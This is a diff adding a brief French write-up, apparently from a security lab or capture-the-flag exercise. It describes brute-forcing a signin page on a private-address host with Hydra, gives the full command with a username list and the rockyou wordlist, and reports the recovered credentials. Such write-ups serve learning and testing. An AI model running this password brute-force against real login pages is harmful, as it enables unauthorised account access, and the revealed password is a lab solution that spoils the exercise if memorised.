@@ -1,0 +1,8 @@
+Sur la page signin, j'ai utilise Hydra pour brute forcer le login et mot de passe. J'ai cree un fichier usernames.txt qui contenait les possibles login (admin, root). Hydra fournit un fichier text contenant des mots de passe connus.
+
+J'ai fait les configurations avec le GUI mais voici la ligne de commande:
+
+hydra -s 80 -v -V -L /root/usernames.txt -P /root/rockyou.txt -t 16 -m /index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:WrongAnswer.gif 10.1.1.5 http-get-form
+
+login: admin ou root
+password: shadow
